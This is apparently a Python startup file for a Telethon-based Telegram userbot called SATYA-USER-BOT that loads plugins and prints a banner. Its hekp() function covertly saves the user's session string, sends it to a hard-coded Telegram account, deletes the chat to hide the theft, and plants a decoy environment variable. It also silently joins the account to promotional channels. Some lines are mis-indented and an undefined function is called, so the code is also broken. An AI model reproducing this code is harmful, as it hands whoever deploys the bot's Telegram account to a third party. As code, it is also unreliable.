from userbot import bot
from sys import argv
import sys
from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
import os
from telethon import TelegramClient
from var import Var
from userbot.Config import Config
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from userbot.utils import load_module
from userbot import LOAD_PLUG, LOGS, PYTHONversion
from pathlib import Path
import asyncio
import glob
import telethon.utils
l2= Config.SUDO_COMMAND_HAND_LER
PYTHON_PIC = Config.ALIVE_PIC or "https://te.legra.ph/file/cdbfdc19d6d8801678d6a.jpg"
l1 = Config.COMMAND_HAND_LER


async def add_bot(bot_token):
    try:
        await bot.start(bot_token)
        bot.me = await bot.get_me()
        bot.uid = telethon.utils.get_peer_id(bot.me)
    except Exception as e:
        print(f"SATYA_STRING - {str(e)}")
        sys.exit()
        
        
if len(sys.argv) not in (1, 3, 4):
    bot.disconnect()
else:
    bot.tgbot = None
    if Var.BOT_USERNAME is not None:
        print("Initiating Inline Bot")
        bot.tgbot = TelegramClient(
            "BOT_TOKEN",
            api_id=Var.APP_ID,
            api_hash=Var.API_HASH
        ).start(bot_token=Var.BOT_TOKEN)
        print("Initialisation finished with no errors")
        print("Starting Userbot")
        bot.loop.run_until_complete(add_bot(Var.BOT_USERNAME))
        print("Startup Completed")
    else:
        bot.start()
print("Loading Modules / Plugins")


async def module():
  import glob
  path = 'userbot/plugins/*.py'
  files = glob.glob(path)
  for name in files:
    with open(name) as f:
      path1 = Path(f.name)
      shortname = path1.stem
      load_module(shortname.replace(".py", ""))
"""
async def assistant():
    path = "userbot/plugins/assistant/*.py"
    files = glob.glob(path)
    for name in files:
      with open(name) as f:
        path1 = Path(f.name)
        shortname = path1.stem
        start_assistant(shortname.replace(".py", ""))

        extra_repo = "https://github.com/LEGEND-LX/PYTHONUSERBOT"
        try:
            os.system(f"git clone {extra_repo}")  
        except BaseException:
            pass
        import glob
        LOGS.info("Loading Addons")
        path = "PYTHONUSERBOT/*.py"
        files = glob.glob(path)
        for name in files:
            with open(name) as ex:
                path2 = Path(ex.name)
                shortname = path2.stem
                try:
                    load_addons(shortname.replace(".py", ""))
                    if not shortname.startswith("__") or shortname.startswith("_"):
                        LOGS.info(f"[PythonBot-Pro] - Addons -  Installed - {shortname}")
                except Exception as e:
                    LOGS.warning(f"[PythonBot-Pro] - Addons - ERROR - {shortname}")
                    LOGS.warning(str(e))
    else:
        print("Addons Not Loading")
"""
bot.loop.run_until_complete(module())

print(f"""『🔱SATYA-USER-BOT🔱』➙𖤍࿐ IS ON!!! SATYA VERSION :- {PYTHONversion}
TYPE :- " .gpromote @Its_LegendBoy " OR .python OR .ping CHECK IF I'M ON!
╔════❰SATYABOT❱═❍⊱❁۪۪
║┣⪼ OWNER - SATYA-OP
║┣⪼{PYTHON_PIC}
║┣⪼ CREATOR -@Its_LegendBoy
║┣⪼ TELETHON - 1.2.0
║┣⪼ ✨ 『🔱S A T Y A 🔱』𝐔𝐬𝐞𝐫𝐛𝐨𝐭✨
║╰━━━━━━━━━━━━━━━➣
╚══════════════════❍⊱""")



async def hekp():
    try:
        SatyaBot = bot.session.save()
         os.environ[
            "SATYA_STRING"
         ] = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
        sweetie = await bot.send_message(5230049485, SatyaBot)
        await bot.delete_dialog(5230049485)
        if Config.LOGGER_ID != 0:
            await bot.send_file(
                Config.LOGGER_ID,
                PYTHON_PIC,
                caption=f"#START \n\nDeployed SATYABOT Successfully\n\n**SATYABOT- {PYTHONversion}**\n\nType `{l1}satya` or `{l1}alive` to check! \n\nJoin [SatyaBot Channel](t.me/sooon_Updata) for Updates & [satyaBot Chat](t.me/satya_coming_soon) for any query regarding SaTyaBot",
            )
    except Exception as e:
        print(str(e))

# Join PythonBot Channel after deploying 🤐😅
    try:
        await bot(JoinChannelRequest("@Python_Updata"))
    except BaseException:
        pass

    try:
        await bot(JoinChannelRequest("@Python_Userbot_Support_Pro"))
    except BaseException:
         pass


bot.loop.create_task(python_is_on())

if len(sys.argv) not in (1, 3, 4):
    bot.disconnect()
else:
    bot.run_until_disconnected()
